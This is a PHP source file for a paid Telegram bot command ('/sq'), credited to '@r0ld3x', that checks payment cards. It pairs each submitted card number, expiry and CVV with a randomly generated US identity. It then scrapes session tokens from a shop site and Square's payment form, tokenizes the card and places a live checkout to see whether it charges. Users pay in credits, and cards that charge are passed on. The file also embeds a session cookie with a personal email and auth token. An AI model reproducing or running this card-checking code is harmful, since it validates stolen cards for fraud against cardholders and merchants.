<?php
function RandomString($length){
return substr(str_shuffle("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"), 0, $length);
};
if(strpos($message, '!sq') === 0 or strpos($message, '/sq') === 0 or strpos($message, '.sq') === 0){
    $keyboard = [
    'inline_keyboard' => [[['text' => 'Features', 'callback_data' => 'paid'], ['text' => 'Buy', 'callback_data' => 'buy'], ['text' => 'Buy Now', 'url' => 'https://t.me/r0ld3x'],]]];
$keyboard = json_encode($keyboard);
checkrole($chatId,$message_id,$keyboard,$nopre,$gId);
$starttime = microtime(true);
$flag = 'getFlags';
$mytime = 'time1';

$link = mysqli_connect("localhost", "root", "", "demo");
    $sql = "SELECT role FROM persons WHERE userid='$gId'";
    $result20 = mysqli_query($link, $sql);
    $json_array = [];
    while ($row = mysqli_fetch_assoc($result20)) {
      $json_array[] = $row;
    }
    $final201 = json_encode($json_array);
    $role = trim(strip_tags(getStr($final201, '"role":"','"')));
mysqli_close($link);
if($role == 'USER'){
    reply_to($chatId,$message_id,$keyboard,$nopre);
    exit();
}elseif(empty($role)){
    reply_to($chatId,$message_id,$keyboard,$noreg);
    exit();
}
sendaction($chatId, typing);
$lista = substr($message, 4);
$lista = clean($lista);
$check = strlen($lista);
$chem = substr($lista, 0,1);
$cc = multiexplode(array(":", "/", " ", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "/", " ", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "/", " ", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "/", " ", "|", ""), $lista)[3];
$strlenn = strlen($cc);
$strlen1 = strlen($mes);
$ano1 = $ano;
$list = preg_replace('/\s/', '|', $lista);
$vaut = array(1,2,7,8,9,0);
if (in_array($chem, $vaut)) { 
    reply_to($chatId, $message_id,$keyboard,$validauth);
    exit();
  } 
if (empty($lista)){
    reply_to($chatId, $message_id,$keyboard,$validauth);
    exit();
}elseif($check<15){
    reply_to($chatId, $message_id,$keyboard,$validauth);
    exit();
}elseif(strlen($strlenn != 16)){
    reply_to($chatId, $message_id,$keyboard,$validauth);
    exit();
}
if (number_format($mes) < 10){$mes = str_replace("0", "", $mes);};
if (strlen($ano) < 4){$ano = "20$ano";};
if(strlen($strlen1 > 2)) {
$ano = $cvv; 
$cvv = $mes;
$mes = $ano1;}

$link = mysqli_connect("localhost", "root", "", "demo");
    $sql = "SELECT credits FROM persons WHERE userid='$gId'";
    $result = mysqli_query($link, $sql);
    $json_array = [];
    while ($row = mysqli_fetch_assoc($result)) {
      $json_array[] = $row;
    }
    $final2 = json_encode($json_array);
    $client = trim(strip_tags(getStr($final2, '"credits":"','"')));
mysqli_close($link);
if($client < 5){ 
    reply_to($chatId, $message_id,$keyboard,$nocredits);
    exit();
}elseif(empty($client)){
    reply_to($chatId, $message_id,$keyboard,$noregister);
    exit();
}

$link = mysqli_connect("localhost", "root", "", "demo");
    $sql = "SELECT time FROM persons WHERE userid='$gId'";
    $result20 = mysqli_query($link, $sql);
    $json_array = [];
    while ($row = mysqli_fetch_assoc($result20)) {
      $json_array[] = $row;
    }
    $final20 = json_encode($json_array);
    $times = trim(strip_tags(getStr($final20, '"time":"','"')));
mysqli_close($link);

$link = mysqli_connect("localhost", "root", "", "demo");    
    $sql = "SELECT role FROM persons WHERE userid='$gId'";
    $result20 = mysqli_query($link, $sql);
    $json_array = [];
    while ($row = mysqli_fetch_assoc($result20)) {
      $json_array[] = $row;
    }
    $final201 = json_encode($json_array);
    $role = trim(strip_tags(getStr($final201, '"role":"','"')));
mysqli_close($link);
    $current = time();
    $sec = $current - $times;
    if($role == 'MEMBER' and $sec < 30){
    $after = 30 - $sec;
    $antispam = urlencode("<b>[ANTISPAM] <u> TRY AGAIN AFTER $after sec.</u></b>");
    reply_to($chatId,$message_id,$keyboard,$antispam);
    exit();
    }
$sss = reply_to($chatId,$message_id,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> □□□□□ 0%[🟥] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <code>@r0ld3x</code></b>");
$respon = json_decode($sss, TRUE);
$message_id_1 = $respon['result']['message_id'];
///////////////////////////////////////////////////////////////////////////////////////////////////////////////
sendaction($chatId, typing);
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=US');
    preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
    $first = $matches1[1][0];
    preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
    $last = $matches1[1][0];
    preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
    $email = $matches1[1][0];
    preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
    $street = $matches1[1][0];
    preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
    $city = $matches1[1][0];
    preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
    $state = $matches1[1][0];
    $state1 = $matches1[1][0];
    preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
    $phone = $matches1[1][0];
    preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
    $zip = $matches1[1][0];
    preg_match_all("(\"username\":\"(.*)\")siU", $get, $matches1);
    $usrnme = $matches1[1][0];
    preg_match_all("(\"password\":\"(.*)\")siU", $get, $matches1);
    $pass = $matches1[1][0];
    preg_match_all("(\"salt\":\"(.*)\")siU", $get, $matches1);
    $salt = $matches1[1][0];
    $pwd = ''.$pass.''.$salt.'';
    preg_match_all("(\"nat\":\"(.*)\")siU", $get, $matches1);
    $con = $matches1[1][0];
    $numero1 = substr($phone, 1,3);
    $numero2 = substr($phone, 6,3);
    $numero3 = substr($phone, 10,4);
    $phone = $numero1.''.$numero2.''.$numero3;
    $serve_arr = array("gmail.com","hotmail.com","yahoo.com","yopmail.com","outlook.com");
    $serv_rnd = $serve_arr[array_rand($serve_arr)];
    $email = str_replace("example.com", $serv_rnd, $email);
    $state = state($state);
$bin = substr($cc,0,6);
$che = bannedbin($bin);
    $ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$bin.'');
curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$fim = json_decode($fim,true);
$roldex = $fim['bank']['name'];
$bincap2 = $fim['country']['alpha2'];
$bincap4 = $fim['type'];
$bincap3 = $fim['scheme'];
$bincap5 = $fim['brand'];
$che = bannedbin($bin);
if(strpos($fim, '"type":"credit"') !== false) {
  $type = 'Credit';
} else {
  $type = 'Debit';
}
curl_close($ch);
    if(!isset($fim) or $che == true) {
    edit_message($chatId,$message_id_1,$keyboard, "<b>❌BIN BANNED</b>");
    exit();
    }

///////////////////////////////////////////////////////////////////////////////////////////////////////////////
// 
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://sole.scvr.co/');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: sole.scvr.co',
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'user-agent: Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile DuckDuckGo/5 Safari/537.36',
'accept-language: en-IN,en-US;q=0.9,en;q=0.8',));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);

$result01 = curl_exec($ch);
$lsess = getStr($result01, '_MyLocal2_session=', ';');
$xref = getStr($result01, 'XSRF-TOKEN=', ';');
$sessid = getStr($result01, '_session_id=', ';');



$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://js.squareup.com/v2/paymentform');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: js.squareup.com',
'accept: */*',
'user-agent: Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile DuckDuckGo/5 Safari/537.36'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);

$result01 = curl_exec($ch);
$jsid = getStr($result01, 'version:"', '"})');
// <arguments.length&&void 0!==arguments[1]?arguments[1]:{};return e=Object.assign({},e,{version:"e4b5f6556f"})
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://sole.scvr.co/shop/checkout');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: sole.scvr.co',
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'accept-language: en-US,en;q=0.9',
'content-type: application/json; charset=UTF-8',
'referer: https://sole.scvr.co/gift-cards',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);

$result01 = curl_exec($ch);
$sess = getStr($result01, "window.squareApplicationId = '", "';");
$lid = getStr($result01, "window.squareLocationId    = '", "';");
edit_message($chatId,$message_id_1,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> ■■□□□ 40%[🟧] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <code>@r0ld3x</code></b>");

// // 
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://pci-connect.squareup.com/v2/iframe?type=main&app_id='.$sess.'&host_name=sole.scvr.co&location_id='.$lid.'&version='.$jsid.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: pci-connect.squareup.com',
'user-agent: Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.101 Mobile DuckDuckGo/5 Safari/537.36',
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
// 'x-requested-with: com.duckduckgo.mobile.android',
'sec-fetch-site: cross-site',
'sec-fetch-mode: navigate',
'sec-fetch-dest: iframe',
'referer: https://sole.scvr.co/',
'accept-language: en-IN,en-US;q=0.9,en;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  edit_message($chatId,$keyboard,$message_id_1,"<b>■■□□□ 40%</b>");

$result01 = curl_exec($ch);
$sestr = getStr($result01, 'pi=di,fi="', '",');
// file_put_contents('text.txt',$result01);
// sendMessage1($sestr);
// var di=hi,pi="7KdgNGnIFMEoIWX1Qe5N5XVAfh1DNU2hAk0SDD3DtDwWayTF5hKdJdJbOJBwXnJ8vhW4hR-WGZLcQ2wVTp0="
// sendMessage1("sestr $sestr");
edit_message($chatId,$message_id_1,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> ■■■□□ 60%[🟨] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <code>@r0ld3x</code></b>");
// file_put_contents("lol.txt",$result01);
// var di=hi,pi="QeMOKcqyGr9F0zBxPrgaGW9o4eRKdHVNyevTVA9rNTpo-WcReXcCs0TNjFvnl6cNI0LQzN6xD0fC_FoDWA==",
  
  // <script>
    // window.squareApplicationId = 'sq0idp-SS58nuXC37l9ghM-0w38Ew';
    // window.squareLocationId    = 'LYDM85B15KCGN';
  // </script>

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://pci-connect.squareup.com/v2/card-nonce?_=1628597480154.'.rand(1000,9999).'&version='.$jsid.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: pci-connect.squareup.com',
'accept: application/json',
'accept-language: en-US,en;q=0.9',
'content-type: application/json; charset=UTF-8',
'origin: https://pci-connect.squareup.com',
'referer: https://pci-connect.squareup.com/v2/iframe?type=main&app_id='.$sess.'&host_name=sole.scvr.co&location_id='.$lid.'&version='.$jsid.'',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);

curl_setopt($ch, CURLOPT_POSTFIELDS, '{"client_id":"'.$sess.'","location_id":"'.$lid.'","session_id":"'.$sestr.'","website_url":"https://sole.scvr.co/","squarejs_version":"'.$jsid.'","analytics_token":"'.RandomString(96).'","card_data":{"number":"'.$cc.'","exp_month":'.$mes.',"exp_year":'.$ano.',"cvv":"'.$cvv.'","billing_postal_code":"'.$zip.'"}}');
$result1 = curl_exec($ch);
$cap1 = json_decode($result1, true);
$cnon = $cap1['card_nonce'];
// exit();
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://sole.scvr.co/graphql');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Accept: */*',
'Accept-Language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6',
'Cookie: _lr_hb_-gcg1ox%2Fsociavore={%22heartbeat%22:1628597406597};_lr_uf_-gcg1ox=7c4114d4-11dc-4afa-8eab-c2aa6a25848b;sociavore_user_v2=%7B%22id%22%3A6714589%2C%22email%22%3A%22roldexstark%40gmail.com%22%2C%22name%22%3A%22Rahul+Kumar%22%2C%22anonymous%22%3Afalse%2C%22chats%22%3A%5B%5D%2C%22firebase_id%22%3A%22-Mfn0FLgOIoPzRDOz9AG%22%2C%22user_id%22%3A%2228dcaaac-2fec-43d5-8223-cb86c9d75b4f%22%2C%22firebase_token%22%3A%22eyJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJmaXJlYmFzZS1hZG1pbnNkay16c2dib0Bzb2NpYXZvcmUtcHJvZC5pYW0uZ3NlcnZpY2VhY2NvdW50LmNvbSIsInN1YiI6ImZpcmViYXNlLWFkbWluc2RrLXpzZ2JvQHNvY2lhdm9yZS1wcm9kLmlhbS5nc2VydmljZWFjY291bnQuY29tIiwiYXVkIjoiaHR0cHM6Ly9pZGVudGl0eXRvb2xraXQuZ29vZ2xlYXBpcy5jb20vZ29vZ2xlLmlkZW50aXR5LmlkZW50aXR5dG9vbGtpdC52MS5JZGVudGl0eVRvb2xraXQiLCJpYXQiOjE2Mjg1OTc0MjcsImV4cCI6MTYyODYwMTAyNywidWlkIjoiLU1mbjBGTGdPSW9QelJET3o5QUciLCJjbGFpbXMiOnsicGFydGlhbF9ndWVzdCI6dHJ1ZX19.aFDJniV5cC1hYQmBd_oMR0ZJ-sRNuHI8jkvW4Sp4If0cAIYwI2EObrsx3XR1IvfWtaeCs9N0clPDbbOenO4qLlOtS7x2V6QYahB80LA1YCVFAcuNn_TuhHI56bwjh1uHnPPgf6r2sBIu4-297kuczrTvrGkxLcxNxRI71szC9Hreyp-90j3teI9g9ypnyr079k5x5nkfouvSk6y-XmCLrnNsodANF1btFARFg7lm6B7NeVmM4PD-bQzBXV2kUeosoM31lEPCUTNYuSad3pF_xnnQYBHQxaaoLQNXVv_9FYMhyg9puA4dFR_3A7yAt4wTi9HQD5SuJTtwHmVhw1VTkg%22%2C%22firebase_token_expired_at%22%3A%222021-08-10T13%3A09%3A27Z%22%7D;XSRF-TOKEN=b%2FwDKQfVPVrpJCY9ZbK1oXzGLHsp48a%2FDgg7GW9OiegV%2FNBAKNHQzIvGm6ghUgW2UWBM0p952v4l%2B%2FrRdjDR7Q%3D%3D;_MyLocal2_session=aEUvbmdnUk5QY0xLalJFTVhVZ1o5TzVabDIrVHJkT3FJQ09zblBLcmp4MVdXUXRZYVRBUnZDTmV4cTUzb1d6TUZHNVJOMXI0NEtNd0pWTEUvUVJwZDQ4SUZOL29RWUo0TzFhWjVBZnhiV0ZZV2pBVHlyZnJsUGtTU084bElmME1JZk53OHg3bnVQWHlETXRGWXFvQVgxYldZbERXTkh0bjJ0Z3cydjlCVG1EbkQ5akhhMnN4V1RkRm5td1ovYm50LS0xQ3NjUFQxTTU2RmtDSTRTYkFiTHRBPT0%3D--e6a8897c3871c1389d35e1e8c5bab928beb35df9;_session_id=TTYyS1pIVFRMUGpUcWxNTU9DMVBlYkRuQ1N4eDZaY3NnTUxLMW9PZGxGWi9FOE9Pd2dKMW9CUWVORk5VZ1hCd0NWdzhUTzZBZGQyaWRmc25vaSs5RFFKSWRxV2hMNGJBT0JoYldQZXlibW15ZURDaFE3cm1CWjhZZVFOL2p4bXZwRGJKYUdEak9XOFRGY1YxOE5LWTlsSEh4TXdxTVN6VnNMdkFib3ZtNStHRFdIbEwzTFV3MmhBSTRscndTaTdYLS1FcG9kdHBOalAwcWNnaGt1S29yTlVBPT0%3D--eacfd8f1d753a9cb8168a1946619e338cc1aae2c;_lr_tabs_-gcg1ox%2Fsociavore={%22sessionID%22:0%2C%22recordingID%22:%224-9e663b5e-ca36-4995-9af4-bbb963fb2dbb%22%2C%22lastActivity%22:1628597478585}',
'Content-Type: application/json',
'Host: sole.scvr.co',
'Origin: https://sole.scvr.co',
'Referer: https://sole.scvr.co/shop/checkout',
'Sec-Fetch-Mode: cors',
'user-agent: Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.101 Mobile DuckDuckGo/5 Safari/537.36c',
'Sec-Fetch-Site: same-origin'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"operationName":"Checkout","variables":{"input":{"customer":{"firstName":"'.$first.'","lastName":"'.$last.'","email":"'.$email.'","subscribed":false,"phone":"+1'.$phone.'"},"locationId":"985","fulfillment":{"kind":"pickup"},"squarePayment":{"sourceId":"'.$cnon.'"}}},"query":"mutation Checkout($input: CheckoutInput!) {\n  checkout(input: $input) {\n    clientMutationId\n    __typename\n  }\n}\n"}');
$result = curl_exec($ch);
    $cap1 = json_decode($result, true);
    $new = $cap1["errors"][0]["extensions"]["details"];
    $res = preg_replace('/_/', ' ', ucfirst($new[0]['message']));
    $ccc = preg_replace('/_/', ' ', ucfirst($new[0]["code"]));
    $code = preg_replace('/_/', ' ', ucfirst($new[1]["code"]));
    $res = trim(strip_tags(getStr($res,'. ','",')));
curl_close($ch);

edit_message($chatId,$message_id_1,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> ■■■■■ 100%[🟩] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <code>@r0ld3x</code></b>");

//////////////////////////////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////////////////////////////
if (!strpos($result, 'checkout":null') and !strpos($result != 're sorry')){
  $status = 'succeeded✅';
  $cc_code = "Charged 10$";
  cvv($list);
  sendMessage1($list);
}
if(empty($ccc) and !empty($res)){
    $ccc = 'Card declined';
}
if(!empty($ccc)){
    $status = $ccc;
}if(!empty($res)){
    $cc_code = $res;
}if(empty($code)){
    $code = 'none';
}

if(empty($result) ){
$result = urlencode("<b>
GATE --> <i>SQUAREUP</i>
CC ->> <code>$cc|$mes|$ano|$cvv|@RoldexVerse</code>
Result ->> Unknown error
Message ->> Check again
Bin Info ->> $bincap4-$bincap3-$bincap5
Bank Info ->> $roldex-$bincap2-{$flag($bincap2)}
Time ->> {$mytime($starttime)}s
Checked By ->> <a href='tg://user?id=$gId'>@${username}</a>[<i>$role</i>]
Bot By --> <code>@r0ld3x</code></b>");
edit_message($chatId,$message_id_1,$keyboard, $result);
    $timest = time();

$link = mysqli_connect("localhost", "root", "", "demo");
    $sql = "UPDATE persons SET time = '$timest' WHERE persons.userid='$gId'";
    $result21 = mysqli_query($link, $sql);
mysqli_close($link);
exit();
}


$link = mysqli_connect("localhost", "root", "", "demo");
    $sql = "SELECT credits FROM persons WHERE userid='$gId'";
    $result = mysqli_query($link, $sql);
    $json_array = [];
    while ($row = mysqli_fetch_assoc($result)) {
      $json_array[] = $row;
    }
    $final2 = json_encode($json_array);
    $client = trim(strip_tags(getStr($final2, '"credits":"','"')));
mysqli_close($link);
    $balance = $client - 5;

$link = mysqli_connect("localhost", "root", "", "demo");
    $sql = "UPDATE persons SET credits = '$balance' WHERE persons.userid='$gId'";
    $result = mysqli_query($link, $sql);
mysqli_close($link);
$result = urlencode("<b>
GATE --> <i>SQUAREUP</i>
CC ->> <code>$cc|$mes|$ano|$cvv|@RoldexVerse</code>
AVS ->> $code
Code ->> $status
Message ->> $cc_code
Bin Info ->> $bincap4-$bincap3-$bincap5
Bank Info ->> $roldex-$bincap2-{$flag($bincap2)}
Time ->> {$mytime($starttime)}s
Checked By ->> <a href='tg://user?id=$gId'>@${username}</a>[<i>$role</i>]
Credit Left ->> ${balance}💰
Bot By --> <code>@r0ld3x</code></b>");
edit_message($chatId,$message_id_1,$keyboard, $result);
    rest($list);
    $timest = time();

$link = mysqli_connect("localhost", "root", "", "demo");
    $sql = "UPDATE persons SET time = '$timest' WHERE persons.userid='$gId'";
    $result21 = mysqli_query($link, $sql);
mysqli_close($link);
}
?>